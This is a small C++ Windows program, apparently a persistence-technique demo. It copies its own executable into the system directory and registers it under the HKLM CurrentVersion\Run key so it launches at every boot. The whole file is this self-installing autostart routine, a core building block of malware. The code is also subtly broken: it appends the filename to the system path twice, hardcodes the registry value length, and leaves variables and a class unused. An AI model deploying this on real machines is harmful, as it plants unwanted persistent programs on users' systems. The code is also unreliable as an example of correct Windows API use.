#include <stdio.h>
#include <windows.h>
#include "../windows_startup/windows_startup.h"

class startup_reg :public Startup
{

};

char* GetFilename(char* p) 
{
    return strrchr(p, '\\');
}

int main()
{
    char filepath[MAX_PATH]{ 0 };
    char modlepath[MAX_PATH]{ 0 };
    char syspath[MAX_PATH]{ 0 };
    strcpy(filepath, "C:\\Users\\weixingyu\\Desktop\\demo_exe.exe");
    GetModuleFileNameA(NULL, modlepath, MAX_PATH);
    GetSystemDirectoryA(syspath, MAX_PATH);

    int ret = CopyFileA(modlepath, strcat(syspath, GetFilename(modlepath)), 1);
    if (ret)
    {
        printf("[*] %s has been copyed to sys dir %s\n", modlepath, syspath);
    }
    else
    {
        printf("[!] %s is exists", modlepath);
    }

    char regname[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    HKEY hKey;
    ret = RegOpenKeyA(HKEY_LOCAL_MACHINE, regname, &hKey);   
    ret = RegSetValueExA(hKey, "MyProm", 0, REG_EXPAND_SZ, (unsigned char*)strcat(syspath, GetFilename(modlepath)), 25); 

    if (ret == 0)
    {
        printf("[*] succes to write run key.\n");
        RegCloseKey(hKey);
    }
    else
    {
        printf("[!] failed to open regedit.%d\n", ret);
        return 0;
    }

    return 0;
}